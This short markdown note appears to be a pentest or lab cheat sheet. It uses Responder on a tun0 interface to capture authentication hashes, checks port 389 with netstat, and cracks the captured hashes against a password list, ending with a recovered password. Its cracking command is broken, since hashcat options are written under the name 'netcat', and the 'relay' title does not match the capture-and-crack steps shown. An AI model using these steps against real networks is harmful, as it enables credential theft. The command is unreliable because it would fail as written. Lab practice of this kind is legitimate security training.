# Authentication Relay 

Responder on GitHub <a href="https://github.com/lgandx/Responder">here</a>

```
sudo responder -I tun0
```

If responder cannot listen to port 389, it is probably because of SLAPD server is running. Check the current state of this port by using :
```
netstat -nat
```

Listening for events :

![image](https://user-images.githubusercontent.com/97956863/231966809-0f5612a1-11a8-4451-9be6-809306e853ed.png)

![image](https://user-images.githubusercontent.com/97956863/231971793-d49f244d-333f-4877-abca-722f998258c7.png)

Write <strong>all</strong> the hash section into a new file (example : hashfile.txt) and start netcat :

```
netcat -m 5600 hashfile.txt path/to/password/list --force
```

![image](https://user-images.githubusercontent.com/97956863/231972881-4cd97235-85f4-495e-b57b-0ec786891143.png)


Password is : FPassword1!
